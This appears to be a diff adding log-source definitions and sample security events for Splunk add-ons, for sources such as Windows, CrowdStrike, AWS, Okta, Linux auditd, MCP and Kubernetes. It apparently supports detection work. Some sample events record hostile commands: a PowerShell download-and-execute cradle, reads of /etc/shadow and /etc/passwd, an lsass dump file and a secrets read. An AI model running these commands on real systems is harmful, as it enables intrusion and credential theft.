@@ -1314,5 +1314,444 @@
     "sample_events": {
       "zia_block": "2026-09-19 14:00:00\t192.168.10.45\tBlock-Malware\thttp://c2-beacon-malicious.biz/payload.exe\tBlocked\tMalware.Trojan.Downloader"
     }
+  },
+  {
+    "id": "microsoft-windows",
+    "vendor": "Microsoft Windows",
+    "vendor_slug": "microsoft_windows",
+    "category": "Host Telemetry & EDR",
+    "name": "Splunk Add-on for Microsoft Windows",
+    "splunkbase_id": null,
+    "splunkbase_url": null,
+    "doc_url": "https://learn.microsoft.com/en-us/windows/security/threat-protection/auditing/event-4624",
+    "sourcetypes": [
+      "XmlWinEventLog:Security",
+      "XmlWinEventLog:Microsoft-Windows-Sysmon/Operational",
+      "XmlWinEventLog:Microsoft-Windows-PowerShell/Operational",
+      "XmlWinEventLog:Microsoft-Windows-Windows Defender/Operational",
+      "XmlWinEventLog:Microsoft-Windows-NTLM/Operational",
+      "sysmon:linux"
+    ],
+    "header_type": "Windows Event XML (WinEvtLog Event element)",
+    "delimiter": null,
+    "timestamp_format": "%Y-%m-%dT%H:%M:%S.%NZ (TimeCreated SystemTime, 7 fraction digits)",
+    "cim_models": [
+      "Authentication",
+      "Change",
+      "Changes",
+      "Endpoint",
+      "Process",
+      "Registry",
+      "Alerts"
+    ],
+    "field_mappings": {
+      "src": "EventData IpAddress",
+      "dest": "System Computer",
+      "vendor_product": "Microsoft Windows Security Auditing",
+      "event_code": "System EventID"
+    },
+    "sample_events": {
+      "logon_success_4624": "<Event xmlns='http://schemas.microsoft.com/win/2004/08/events/event'><System><Provider Name='Microsoft-Windows-Security-Auditing'/><EventID>4624</EventID><Version>2</Version><Level>0</Level><Task>0</Task><Opcode>0</Opcode><Keywords>0x8020000000000000</Keywords><TimeCreated SystemTime='2026-10-26T14:58:14.9836241Z'/><EventRecordID>41231</EventRecordID><Correlation/><Execution ProcessID='612' ThreadID='2312'/><Channel>Security</Channel><Computer>WAVE1-LAB-WIN01</Computer><Security UserID='S-1-5-18'/></System><EventData><Data Name='SubjectUserSid'>S-1-5-21-1004336348-1177238915-682003330-2645</Data><Data Name='LogonType'>10</Data><Data Name='AuthenticationPackageName'>Negotiate</Data></EventData></Event>",
+      "sysmon_process_create": "<Event xmlns='http://schemas.microsoft.com/win/2004/08/events/event'><System><Provider Name='Microsoft-Windows-Sysmon' Guid='{5770385f-c22a-43e0-bf4c-06f5698ffbd9}'/><EventID>1</EventID><Version>5</Version><Level>4</Level><Task>1</Task><Opcode>0</Opcode><Keywords>0x8000000000000000</Keywords><TimeCreated SystemTime='2026-04-24T10:34:55.5178180Z'/><EventRecordID>3411</EventRecordID><Correlation/><Execution ProcessID='2432' ThreadID='3608'/><Channel>Microsoft-Windows-Sysmon/Operational</Channel><Computer>EC2AMAZ-TLJH2O4.attackrange.local</Computer><Security UserID='S-1-5-18'/></System><EventData><Data Name='RuleName'>-</Data><Data Name='UtcTime'>2026-04-24 10:34:55.516</Data><Data Name='ProcessGuid'>{c906acb5-474f-69eb-4b08-000000006602}</Data><Data Name='ProcessId'>5260</Data><Data Name='Image'>C:\\Program Files\\SplunkUniversalForwarder\\bin\\splunk-powershell.exe</Data><Data Name='FileVersion'>-</Data><Data Name='Description'>-</Data><Data Name='Product'>-</Data><Data Name='Company'>-</Data><Data Name='OriginalFileName'>-</Data><Data Name='CommandLine'>\"C:\\Program Files\\SplunkUniversalForwarder\\bin\\splunk-powershell.exe\" --ps2</Data><Data Name='CurrentDirectory'>C:\\Windows\\system32\\</Data><Data Name='User'>NT AUTHORITY\\SYSTEM</Data><Data Name='LogonGuid'>{c906acb5-0eda-69eb-e703-000000000000}</Data><Data Name='LogonId'>0x3e7</Data><Data Name='TerminalSessionId'>0</Data><Data Name='IntegrityLevel'>System</Data><Data Name='Hashes'>MD5=FCB0604926A81A7A7746B7066B286DC8,SHA256=211CC17F7C47B5CCF2B980A2091D392C73C9ABADDB1061CE419C5357DD5545C2,IMPHASH=44A0061B15025B4FBD3C0D7BCF7E24E9<",
+      "sysmon_linux_process": "<Event><System><Provider Name=\"Linux-Sysmon\" Guid=\"{ff032593-a8d3-4f13-b0d6-01fc615a0f97}\"/><EventID>3</EventID><Version>5</Version><Level>4</Level><Task>3</Task><Opcode>0</Opcode><Keywords>0x8000000000000000</Keywords><TimeCreated SystemTime=\"2021-12-21T12:50:08.209569000Z\"/><EventRecordID>723195</EventRecordID><Correlation/><Execution ProcessID=\"4433\" ThreadID=\"4433\"/><Channel>Linux-Sysmon/Operational</Channel><Computer>sysmonlinux-tcontreras-attack-range-643</Computer><Security UserId=\"0\"/></System><EventData><Data Name=\"RuleName\">-</Data><Data Name=\"UtcTime\">2021-12-21 12:50:08.218</Data><Data Name=\"ProcessGuid\">{ec2b6afe-95d9-61c1-5175-3a0400000000}</Data><Data Name=\"ProcessId\">5346</Data><Data Name=\"Image\">/opt/splunkforwarder/etc/apps/Splunk_TA_stream/linux_x86_64/bin/streamfwd</Data><Data Name=\"User\">root</Data><Data Name=\"Protocol\">tcp</Data><Data Name=\"Initiated\">true</Data><Data Name=\"SourceIsIpv6\">false</Data><Data Name=\"SourceIp\">10.0.1.25</Data><Data Name=\"SourceHostname\">-</Data><Data Name=\"SourcePort\">50552</Data><Data Name=\"SourcePortName\">-</Data><Data Name=\"DestinationIsIpv6\">false</Data><Data Name=\"DestinationIp\">10.0.1.12</Data><Data Name=\"DestinationHostname\">-</Data><Data Name=\"DestinationPort\">8000</Data><Data Name=\"DestinationPortName\">-</Data></EventData></Event>",
+      "powershell_script_block_4104": "<Event xmlns='http://schemas.microsoft.com/win/2004/08/events/event'><System><Provider Name='Microsoft-Windows-PowerShell'/><EventID>4104</EventID><Version>2</Version><Level>4</Level><TimeCreated SystemTime='2026-10-26T14:58:14.9836241Z'/><EventRecordID>41233</EventRecordID><Correlation/><Execution ProcessID='7400' ThreadID='9872'/><Channel>Microsoft-Windows-PowerShell/Operational</Channel><Computer>WAVE1-LAB-WIN01</Computer><Security UserID='S-1-5-18'/></System><EventData><Data Name='ScriptBlockText'>IEX (New-Object Net.WebClient).DownloadString('http://10.0.9.9/x.ps1')</Data><Data Name='Path'></Data></EventData></Event>"
+    }
+  },
+  {
+    "id": "crowdstrike-falcon",
+    "vendor": "CrowdStrike",
+    "vendor_slug": "crowdstrike",
+    "category": "EDR & Threat Detection",
+    "name": "Splunk Add-on for CrowdStrike FDR",
+    "splunkbase_id": null,
+    "splunkbase_url": null,
+    "doc_url": "https://www.crowdstrike.com/resources/how-to-work-with-crowdstrike-json-events/",
+    "sourcetypes": [
+      "crowdstrike:events:sensor"
+    ],
+    "header_type": "Single-line Falcon Event JSON",
+    "delimiter": null,
+    "timestamp_format": "epoch milliseconds (timestamp field)",
+    "cim_models": [
+      "Alerts",
+      "Endpoint",
+      "Malware",
+      "Process"
+    ],
+    "field_mappings": {
+      "src": "event LocalIP",
+      "dest": "event RemoteAddressIP4",
+      "vendor_product": "CrowdStrike Falcon",
+      "event_code": "event_simpleName"
+    },
+    "sample_events": {
+      "falcon_sensor_process": "{\"event_simpleName\":\"FileDeleteInfo\",\"ContextTimeStamp\":\"1658918559.957\",\"ConfigStateHash\":\"1172426367\",\"ContextProcessId\":\"332855234\",\"ContextThreadId\":\"3328694542\",\"aip\":\"35.157.24.242\",\"ConfigBuild\":\"1007.3.0015406.1\",\"event_platform\":\"Win\",\"TreeId\":\"21164578\",\"Entitlements\":\"15\",\"name\":\"FileDeleteInfoV1\",\"id\":\"d70481ef-0d98-11ed-acf0-06aeb8794401\",\"EffectiveTransmissionClass\":\"2\",\"aid\":\"f0778584e83c4efc9cf026bc1e7f0489\",\"timestamp\":\"1658918561194\",\"cid\":\"124cb22314bf4f519be84bce582e7a6b\",\"TargetFileName\":\"\\\\Device\\\\HarddiskVolume1\\\\Windows\\\\Temp\\\\lsass-xordump.t1003.001.dmp\"}"
+    }
+  },
+  {
+    "id": "amazon-aws",
+    "vendor": "Amazon Web Services",
+    "vendor_slug": "amazon_aws",
+    "category": "Cloud Infrastructure & Security",
+    "name": "Splunk Add-on for AWS",
+    "splunkbase_id": null,
+    "splunkbase_url": null,
+    "doc_url": "https://docs.aws.amazon.com/awscloudtrail/latest/userguide/cloudtrail-event-reference.html",
+    "sourcetypes": [
+      "aws:cloudtrail",
+      "aws:cloudwatchlogs:vpcflow"
+    ],
+    "header_type": "Single-line CloudTrail JSON",
+    "delimiter": null,
+    "timestamp_format": "%Y-%m-%dT%H:%M:%SZ (eventTime)",
+    "cim_models": [
+      "Authentication",
+      "Cloud",
+      "Change",
+      "Compute Inventory",
+      "Alerts"
+    ],
+    "field_mappings": {
+      "src": "sourceIPAddress",
+      "dest": "resources[].arn",
+      "vendor_product": "Amazon Web Services",
+      "event_code": "eventName"
+    },
+    "sample_events": {
+      "cloudtrail_console_login": "{\"eventVersion\":\"1.11\",\"userIdentity\":{\"type\":\"AssumedRole\",\"principalId\":\"AROAEXAMPLE00000000:detection-test\",\"arn\":\"arn:aws:sts::111111111111:assumed-role/SecurityResearchRole/detection-test\",\"accountId\":\"111111111111\",\"accessKeyId\":\"ASIAEXAMPLE00000000\",\"sessionContext\":{\"sessionIssuer\":{\"type\":\"Role\",\"principalId\":\"AROAEXAMPLE00000000:detection-test\",\"arn\":\"arn:aws:iam::111111111111:role/SecurityResearchRole\",\"accountId\":\"111111111111\",\"userName\":\"admin\"},\"attributes\":{\"creationDate\":\"2026-09-23T07:41:44Z\",\"mfaAuthenticated\":\"false\"}}},\"eventTime\":\"2026-09-23T09:16:54Z\",\"eventSource\":\"ec2-instance-connect.amazonaws.com\",\"eventName\":\"SendSSHPublicKey\",\"awsRegion\":\"eu-west-3\",\"sourceIPAddress\":\"192.0.2.10\",\"userAgent\":\"aws-cli/2.36.10 md/awscrt#0.36.0 ua/2.1 os/macos#25.6.0 md/arch#arm64 lang/python#3.14.7 md/pyimpl#CPython m/E,Z,n,b cfg/retry-mode#standard md/installer#source sid/674de9a0705a md/prompt#off md/command#ec2-instance-connect.send-ssh-public-key\",\"requestParameters\":{\"instanceId\":\"i-0123456789abcdef0\",\"instanceOSUser\":\"ec2-user\",\"sSHPublicKey\":\"ssh-rsa SANITIZED_PUBLIC_KEY detection-test\",\"availabilityZone\":\"eu-west-3a\"},\"responseElements\":{\"requestId\":\"49f33edd-4b54-46ed-8c53-32d70d4bae54\",\"success\":true},\"requestID\":\"49f33edd-4b54-46ed-8c53-32d70d4bae54\",\"eventID\":\"a2c8c1a9-7483-475a-b240-cb8258c7363f\",\"readOnly\":false,\"eventType\":\"AwsApiCall\",\"managementEvent\":true,\"recipientAccountId\":\"111111111111\",\"eventCategory\":\"Management\",\"tlsDetails\":{\"tlsVersion\":\"TLSv1.3\",\"cipherSuite\":\"TLS_AES_128_GCM_SHA256\",\"clientProvidedHostHeader\":\"ec2-instance-connect.eu-w"
+    }
+  },
+  {
+    "id": "microsoft-365",
+    "vendor": "Microsoft 365",
+    "vendor_slug": "microsoft_365",
+    "category": "SaaS & Identity Telemetry",
+    "name": "Splunk Add-on for Microsoft Office 365",
+    "splunkbase_id": null,
+    "splunkbase_url": null,
+    "doc_url": "https://learn.microsoft.com/en-us/office/office-365-management-api/office-365-management-activity-api-schema",
+    "sourcetypes": [
+      "o365:management:activity"
+    ],
+    "header_type": "Single-line Management Activity JSON",
+    "delimiter": null,
+    "timestamp_format": "%Y-%m-%dT%H:%M:%S (CreationTime)",
+    "cim_models": [
+      "Authentication",
+      "Email",
+      "Change",
+      "Alerts"
+    ],
+    "field_mappings": {
+      "src": "ClientIP",
+      "dest": "UserId",
+      "vendor_product": "Microsoft 365",
+      "event_code": "Operation"
+    },
+    "sample_events": {
+      "o365_login_failed": "{\"CreationTime\":\"2026-10-26T14:58:14\",\"Id\":\"a83f4b1-7f01-4f3f-ac56-b3d1c9cdbfc0\",\"Operation\":\"UserLoginFailed\",\"OrganizationId\":\"e68a6f5e-1b1f-4846-a9a3-d3eb385bdddd\",\"RecordType\":15,\"ResultStatus\":\"Failed\",\"UserKey\":\"detection.test@contoso.com\",\"UserType\":0,\"Version\":1,\"Workload\":\"AzureActiveDirectory\",\"ClientIP\":\"10.0.9.9\",\"UserId\":\"detection.test@contoso.com\",\"LogonError\":\"SsoArtifactInvalidOrExpired\"}"
+    }
+  },
+  {
+    "id": "microsoft-azure-monitor",
+    "vendor": "Microsoft Azure Monitor",
+    "vendor_slug": "microsoft_azure",
+    "category": "Cloud Infrastructure & Security",
+    "name": "Splunk Add-on for Microsoft Cloud Services",
+    "splunkbase_id": null,
+    "splunkbase_url": null,
+    "doc_url": "https://learn.microsoft.com/en-us/azure/azure-monitor/essentials/activity-log-schema",
+    "sourcetypes": [
+      "azure:monitor:aad",
+      "azure:monitor:activity"
+    ],
+    "header_type": "Single-line Azure Monitor record JSON",
+    "delimiter": null,
+    "timestamp_format": "%Y-%m-%dT%H:%M:%S.%fZ (time)",
+    "cim_models": [
+      "Authentication",
+      "Change",
+      "Cloud",
+      "Alerts"
+    ],
+    "field_mappings": {
+      "src": "properties.ipAddress",
+      "dest": "resourceId",
+      "vendor_product": "Microsoft Azure",
+      "event_code": "category / operationName"
+    },
+    "sample_events": {
+      "activity_log_action": "{\"authorization\": {\"action\": \"Microsoft.Automation/automationAccounts/runbooks/write\", \"scope\": \"/subscriptions/1aee0e3d-b75b-440a-a927-76f0552a14e6/resourceGroups/resourceGroup1/providers/Microsoft.Automation/automationAccounts/SuspiciousAutomationAccount/runbooks/SuspiciousRunbook\"}, \"caller\": \"evilAdmin@contoso.com\", \"channels\": \"Operation\", \"claims\": {\"aud\": \"https://management.core.windows.net/\", \"iss\": \"https://sts.windows.net/ad251139-d600-4f45-a8ba-9f6ca1e5a93d/\", \"iat\": \"1661194261\", \"nbf\": \"1661194261\", \"exp\": \"1661198249\", \"http://schemas.microsoft.com/claims/authnclassreference\": \"1\", \"aio\": \"AWQAm/8TAAAA3iMcbqqPPdXPATT7oalIKsh6wEFsyQ+zUVCshaLu77xsLlt067TtI11gy5hAx+z905hrX1VBehDGaedvEg2UF0BSbHVL9bJrry4zk3Xt+HNt5dTXDDgABOFuNB4QJBUW\", \"altsecid\": \"1:live.com:000161008492EF5F\", \"http://schemas.microsoft.com/claims/authnmethodsreferences\": \"pwd,mfa\", \"appid\": \"c44b4083-3bb0-49c1-b47d-974e53cbdf3c\", \"appidacr\": \"2\", \"http://schemas.xmlsoap.org/ws/2005/05/identity/claims/emailaddress\": \"evilAdmin@contoso.com\", \"http://schemas.xmlsoap.org/ws/2005/05/identity/claims/surname\": \"Doe\", \"http://schemas.xmlsoap.org/ws/2005/05/identity/claims/givenname\": \"John\", \"groups\": \"ecb1fc87-1938-45ff-aaf3-661cee183b11\", \"http://schemas.microsoft.com/identity/claims/identityprovider\": \"live.com\", \"ipaddr\": \"190.0.0.1\", \"name\": \"John Doe\", \"http://schemas.microsoft.com/identity/claims/objectidentifier\": \"74b87c49-c202-4101-a8aa-ef18ecc815e8\", \"puid\": \"1003200203ECE231\", \"rh\": \"0.AX0AORElrQDWRU-oup9soeWpPUZIf3kAutdPukPawfj2MBOaAIM.\", \"http://schemas.microsoft.com/identity/claims/scope\": ",
+      "aad_signin_failure": "{\"time\":\"2026-10-26T14:58:14.9836241Z\",\"resourceId\":\"/tenants/ad251139-d600-4f45-a8ba-9f6ca1e5a93d/providers/Microsoft.aadiam\",\"operationName\":\"Sign-in activity\",\"category\":\"SignInLogs\",\"properties\":{\"userPrincipalName\":\"detection.test@contoso.com\",\"ipAddress\":\"10.0.9.9\",\"isInteractive\":true,\"status\":{\"failureDetails\":[{\"errorCode\":50126,\"message\":\"Invalid username or password\"}]}}}"
+    }
+  },
+  {
+    "id": "okta-im2",
+    "vendor": "Okta",
+    "vendor_slug": "okta",
+    "category": "Identity & Access Management",
+    "name": "Okta Add-on for Splunk",
+    "splunkbase_id": null,
+    "splunkbase_url": null,
+    "doc_url": "https://developer.okta.com/docs/reference/api/system-log/",
+    "sourcetypes": [
+      "OktaIM2:log"
+    ],
+    "header_type": "Okta System Log JSON",
+    "delimiter": null,
+    "timestamp_format": "%Y-%m-%dT%H:%M:%S.%fZ (published)",
+    "cim_models": [
+      "Authentication",
+      "Change",
+      "Alerts"
+    ],
+    "field_mappings": {
+      "src": "client.ipAddress",
+      "dest": "actor.alternateId",
+      "vendor_product": "Okta",
+      "event_code": "eventType"
+    },
+    "sample_events": {
+      "okta_system_log": "{\"actor\": {\"id\": \"00uffks4r9kkYNxpj5d7\", \"type\": \"User\", \"alternateId\": \"user15@splunkresearch.com\", \"displayName\": \"user15\", \"detailEntry\": null}, \"client\": {\"userAgent\": {\"rawUserAgent\": \"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Safari/537.36\", \"os\": \"Mac OS 11.3.1 (Sonoma)\", \"browser\": \"CHROME\"}, \"zone\": \"null\", \"device\": \"Computer\", \"id\": null, \"ipAddress\": \"120.1.121.43\", \"geographicalContext\": {\"city\": \"Ohio\", \"state\": \"Ohio\", \"country\": \"United States\", \"postalCode\": \"10065\", \"geolocation\": {\"lat\": 20.7652, \"lon\": -22.9588}}}, \"device\": null, \"authenticationContext\": {\"authenticationProvider\": null, \"credentialProvider\": null, \"credentialType\": null, \"issuer\": null, \"interface\": null, \"authenticationStep\": 0, \"externalSessionId\": \"trsDTWgT1AlTM2Dai7IRY7cHQ\"}, \"displayMessage\": \"User report suspicious activity\", \"eventType\": \"user.account.report_suspicious_activity_by_enduser\", \"outcome\": {\"result\": \"SUCCESS\", \"reason\": null}, \"published\": \"2024-03-11T16:28:40.048Z\", \"securityContext\": {\"asNumber\": 12271, \"asOrg\": \"twc internal spectrum\", \"isp\": \"charter communications inc\", \"domain\": \"rr.com\", \"isProxy\": false}, \"severity\": \"WARN\", \"debugContext\": {\"debugData\": {\"suspiciousActivityEventCountry\": \"United States\", \"suspiciousActivityBrowser\": \"CHROME\", \"suspiciousActivityEventId\": \"5e2fd100-dfc4-11ee-be83-538191b64b24\", \"suspiciousActivityEventState\": \"Ohio\", \"suspiciousActivityTimestamp\": \"2024-03-11T16:28:18.184Z\", \"requestUri\": \"/api/internal/users/me/report-suspicious-activity\", \"suspiciousActivityOs\": "
+    }
+  },
+  {
+    "id": "suricata-oisf",
+    "vendor": "Suricata (OISF)",
+    "vendor_slug": "suricata_oisf",
+    "category": "Network Intrusion Detection",
+    "name": null,
+    "splunkbase_id": null,
+    "splunkbase_url": null,
+    "doc_url": "https://docs.suricata.io/en/suricata-6.0.2/output/eve/eve-json-format.html",
+    "sourcetypes": [
+      "suricata"
+    ],
+    "header_type": "EVE single-line JSON",
+    "delimiter": null,
+    "timestamp_format": "%Y-%m-%dT%H:%M:%S.%f+0000 (timestamp)",
+    "cim_models": [
+      "Intrusion Detection",
+      "Network Traffic",
+      "Network Sessions"
+    ],
+    "field_mappings": {
+      "src": "src_ip",
+      "dest": "dest_ip",
+      "src_port": "src_port",
+      "dest_port": "dest_port",
+      "transport": "proto",
+      "vendor_product": "Suricata",
+      "event_code": "event_type"
+    },
+    "sample_events": {
+      "suricata_eve": "{\"timestamp\":\"2024-08-02T14:21:23.992673+0000\",\"flow_id\":1879083606744645,\"pcap_cnt\":2035,\"event_type\":\"http\",\"src_ip\":\"10.3.10.8\",\"src_port\":50296,\"dest_ip\":\"10.3.99.1\",\"dest_port\":80,\"proto\":\"TCP\",\"pkt_src\":\"wire/pcap\",\"tx_id\":2,\"http\":{\"hostname\":\"10.3.99.1\",\"url\":\"/plugin/search/\",\"http_user_agent\":\"Mozilla/5.0 (compatible; MSIE 10.0; Windows NT 10.0; WOW64; Trident/7.0; Specula; Microsoft Outlook 16.0\",\"http_content_type\":\"text/html\",\"http_method\":\"POST\",\"protocol\":\"HTTP/1.1\",\"status\":200,\"length\":59,\"request_headers\":[{\"name\":\"Connection\",\"value\":\"Keep-Alive\"},{\"name\":\"Content-Type\",\"value\":\"application/x-www-form-urlencoded\"},{\"name\":\"Accept\",\"value\":\"*/*\"},{\"name\":\"Accept-Language\",\"value\":\"en-us\"},{\"name\":\"User-Agent\",\"value\":\"Mozilla/5.0 (compatible; MSIE 10.0; Windows NT 10.0; WOW64; Trident/7.0; Specula; Microsoft Outlook 16.0\"},{\"name\":\"Content-Length\",\"value\":\"58\"},{\"name\":\"Host\",\"value\":\"10.3.99.1\"}],\"response_headers\":[{\"name\":\"Server\",\"value\":\"Microsoft-IIS/8.5\"},{\"name\":\"Content-Type\",\"value\":\"text/html; charset=UTF-8\"},{\"name\":\"Date\",\"value\":\"Fri, 02 Aug 2024 14:21:23 GMT\"},{\"name\":\"Content-Length\",\"value\":\"59\"}]}}"
+    }
+  },
+  {
+    "id": "linux-infrastructure",
+    "vendor": "Linux Infrastructure",
+    "vendor_slug": "linux_infrastructure",
+    "category": "Host Telemetry & EDR",
+    "name": "Splunk Add-on for Unix and Linux",
+    "splunkbase_id": null,
+    "splunkbase_url": null,
+    "doc_url": "https://man7.org/linux/man-pages/man5/auditd.conf.5.html",
+    "sourcetypes": [
+      "auditd",
+      "linux_messages_syslog"
+    ],
+    "header_type": "auditd native text records / RFC 3164 syslog",
+    "delimiter": " ",
+    "timestamp_format": "%b %d %H:%M:%S (syslog) + audit(MM/DD/YYYY hh:mm:ss.mss:serial)",
+    "cim_models": [
+      "Authentication",
+      "Change",
+      "Process",
+      "Endpoint"
+    ],
+    "field_mappings": {
+      "src": "addr",
+      "dest": "node",
+      "vendor_product": "Linux auditd",
+      "event_code": "type"
+    },
+    "sample_events": {
+      "auditd_syscall": "type=PROCTITLE msg=audit(02/20/2025 13:07:46.504:118908) : proctitle=cat /etc/shadow /etc/shadow- /etc/shadow~ /etc/gshadow /etc/gshadow- /etc/master.passwd /etc/spwd.db",
+      "linux_messages": "Oct 26 14:58:14 netops-lab-host sshd[35510]: Accepted publickey for netops from 10.0.9.9 port 49304 ssh2: RSA xxx"
+    }
+  },
+  {
+    "id": "osquery-results",
+    "vendor": "osquery",
+    "vendor_slug": "osquery",
+    "category": "Host Telemetry & EDR",
+    "name": null,
+    "splunkbase_id": null,
+    "splunkbase_url": null,
+    "doc_url": "https://osquery.readthedocs.io/en/stable/deployment/logging/",
+    "sourcetypes": [
+      "osquery:results"
+    ],
+    "header_type": "osquery differential result JSON",
+    "delimiter": null,
+    "timestamp_format": "%a %b %d %H:%M:%S %Y UTC (calendarTime) + unixTime epoch",
+    "cim_models": [
+      "Endpoint",
+      "Process",
+      "Change"
+    ],
+    "field_mappings": {
+      "src": "columns.address",
+      "dest": "hostIdentifier",
+      "vendor_product": "osquery",
+      "event_code": "name"
+    },
+    "sample_events": {
+      "osquery_results": "{\"name\":\"log_processes\",\"hostIdentifier\":\"jamies-Virtual-Machine.local\",\"calendarTime\":\"Fri Aug 15 13:36:27 2025 UTC\",\"unixTime\":1755264987,\"epoch\":0,\"counter\":7742,\"numerics\":false,\"columns\":{\"cdhash\":\"f5fb9996783aeacda7399ef5babcfab5b5af7e30\",\"child_pid\":\"\",\"cmdline\":\"/usr/libexec/ApplicationFirewall/socketfilterfw --getglobalstate \",\"cmdline_count\":\"2\",\"codesigning_flags\":\"\",\"cwd\":\"/private/tmp\",\"egid\":\"0\",\"env\":\"TERM=xterm-256color SSH_AUTH_SOCK=/private/tmp/com.apple.launchd.ljOFYstfWD/Listeners __CF_USER_TEXT_ENCODING=0x0:0:2 PATH=/usr/local/microsoft/powershell/7:/opt/homebrew/bin:/opt/homebrew/sbin:/usr/local/bin:/System/Cryptexes/App/usr/bin:/usr/bin:/bin:/usr/sbin:/sbin:/var/run/com.apple.security.cryptexd/codex.system/bootstrap/usr/local/bin:/var/run/com.apple.security.cryptexd/codex.system/bootstrap/usr/bin:/var/run/com.apple.security.cryptexd/codex.system/bootstrap/usr/appleinternal/bin MAIL=/var/mail/root LANG=en_GB.UTF-8 HOME=/Users/jamie LOGNAME=root USER=root SHELL=/bin/sh \\\"SUDO_COMMAND=/usr/libexec/ApplicationFirewall/socketfilterfw --getglobalstate\\\" SUDO_USER=root SUDO_UID=0 SUDO_GID=0 \",\"env_count\":\"14\",\"euid\":\"0\",\"event_type\":\"exec\",\"exit_code\":\"\",\"gid\":\"0\",\"global_seq_num\":\"32552\",\"original_parent\":\"12552\",\"parent\":\"12552\",\"parent_pidversion\":\"28773\",\"path\":\"/usr/libexec/ApplicationFirewall/socketfilterfw\",\"pid\":\"12553\",\"pidversion\":\"28775\",\"platform_binary\":\"1\",\"responsible_pid\":\"643\",\"responsible_pidversion\":\"1577\",\"seq_num\":\"12417\",\"session_id\":\"792\",\"signing_id\":\"com.apple.ALF.ApplicationFirewall\",\"team_id\":\"\",\"time\":\"1755264975\",\"uid\":\"0\",\"usern"
+    }
+  },
+  {
+    "id": "ollama-server",
+    "vendor": "Ollama (local LLM runtime)",
+    "vendor_slug": "ollama",
+    "category": "Agentic AI Telemetry",
+    "name": null,
+    "splunkbase_id": null,
+    "splunkbase_url": null,
+    "doc_url": "https://github.com/ollama/ollama/blob/main/docs/faq.md",
+    "sourcetypes": [
+      "ollama:server"
+    ],
+    "header_type": "Sonoma-style JSON API log records (gin access style)",
+    "delimiter": null,
+    "timestamp_format": "fixed epoch seconds + duration ms",
+    "cim_models": [
+      "Cloud",
+      "Change"
+    ],
+    "field_mappings": {
+      "src": "RemoteAddr",
+      "vendor_product": "Ollama"
+    },
+    "sample_events": {
+      "ollama_api_completion": "{\"Content-Type\":\"application/json\",\"Content-Length\":\"132\",\"Host\":\"127.0.0.1:18089\", \"RemoteAddr\":\"10.0.9.9:49304\",\"Method\":\"POST\",\"Path\":\"/api/generate\",\"Model\":\"llama2\",\"RequestID\":\"1c812f4d-4b54-46ed\",\"Latency\":\"371ms\"}"
+    }
+  },
+  {
+    "id": "model-context-protocol",
+    "vendor": "Model Context Protocol (agentic AI)",
+    "vendor_slug": "model_context_protocol",
+    "category": "Agentic AI Telemetry",
+    "name": null,
+    "splunkbase_id": null,
+    "splunkbase_url": null,
+    "doc_url": "https://modelcontextprotocol.io/specification",
+    "sourcetypes": [
+      "mcp:jsonrpc"
+    ],
+    "header_type": "MCP JSON-RPC 2.0 record",
+    "delimiter": null,
+    "timestamp_format": "%Y-%m-%dT%H:%M:%S.%fZ (ts)",
+    "cim_models": [
+      "Cloud",
+      "Change"
+    ],
+    "field_mappings": {
+      "src": "peer",
+      "vendor_product": "MCP",
+      "event_code": "method"
+    },
+    "sample_events": {
+      "mcp_tools_call": "{\"jsonrpc\":\"2.0\",\"id\":7,\"method\":\"tools/call\",\"params\":{\"name\":\"fs.read_file\",\"arguments\":{\"path\":\"/etc/passwd\"}},\"ts\":\"2026-10-26T14:58:14.98Z\"}"
+    }
+  },
+  {
+    "id": "google-workspace",
+    "vendor": "Google Workspace",
+    "vendor_slug": "google_workspace",
+    "category": "SaaS & Identity Telemetry",
+    "name": "Add-on for Google Workspace",
+    "splunkbase_id": null,
+    "splunkbase_url": null,
+    "doc_url": "https://support.google.com/a/answer/4579696?hl=en",
+    "sourcetypes": [
+      "gws:reports:login"
+    ],
+    "header_type": "Workspace Reports JSON",
+    "delimiter": null,
+    "timestamp_format": "%Y-%m-%dT%H:%M:%S.%fZ (id.time)",
+    "cim_models": [
+      "Authentication",
+      "Change"
+    ],
+    "field_mappings": {
+      "src": "ipAddress",
+      "dest": "actor.email",
+      "vendor_product": "Google Workspace",
+      "event_code": "eventName"
+    },
+    "sample_events": {
+      "gws_login": "{\"id\":{\"time\":\"2026-10-26T14:58:14.983Z\",\"uniqueQualifier\":134752032,\"applicationName\":\"login\",\"customerId\":\"C04a7b8d1\"},\"etag\":\"\\\"xxx\\\"\",\"actor\":{\"email\":\"hunt.lab@contoso.com\",\"profileId\":\"112233445566778899001\"},\"ipAddress\":\"10.0.9.9\",\"events\":[{\"type\":\"login\",\"name\":\"login_success\",\"parameters\":[{\"name\":\"login_type\",\"value\":\"google_password\"}],\"success\":true}]}"
+    }
+  },
+  {
+    "id": "kubernetes-falco",
+    "vendor": "Kubernetes & Falco (CNCF)",
+    "vendor_slug": "kubernetes",
+    "category": "Container & Orchestration Telemetry",
+    "name": "Splunk Add-on for Kubernetes / SC4S",
+    "splunkbase_id": null,
+    "splunkbase_url": null,
+    "doc_url": "https://kubernetes.io/docs/reference/config-api/apiserver-audit.v1/",
+    "sourcetypes": [
+      "kube:audit",
+      "kube:container:falco"
+    ],
+    "header_type": "kubectl audit v1 JSON / Falco event stream (permute container stdout)",
+    "delimiter": null,
+    "timestamp_format": "RFC 3339 stageTimestamp / ISO (time)",
+    "cim_models": [
+      "Change",
+      "Container",
+      "Process",
+      "Endpoint"
+    ],
+    "field_mappings": {
+      "src": "sourceIPs[0]",
+      "dest": "objectRef.name",
+      "vendor_product": "Kubernetes",
+      "event_code": "verb"
+    },
+    "sample_events": {
+      "k8s_audit": "{\"kind\":\"Event\",\"apiVersion\":\"audit.k8s.io/v1\",\"level\":\"RequestResponse\",\"auditID\":\"e73d1ab0-6e8b-4b2f-9e10-c733777c5f7a\",\"stage\":\"ResponseComplete\",\"requestURI\":\"/api/v1/namespaces/netspout/secrets/db-credentials\",\"verb\":\"get\",\"user\":{\"username\":\"kubernetes-admin\"},\"sourceIPs\":[\"10.0.9.9\"],\"stageTimestamp\":\"2026-10-26T14:58:14.983624Z\",\"responseStatus\":{\"code\":200}}"
+    }
+  },
+  {
+    "id": "crushftp",
+    "vendor": "CrushFTP",
+    "vendor_slug": "crushftp",
+    "category": "File Transfer & Exfiltration Telemetry",
+    "name": null,
+    "splunkbase_id": null,
+    "splunkbase_url": null,
+    "doc_url": "https://www.crushftp.com/crush10wiki/Wiki.jsp?page=Logging",
+    "sourcetypes": [
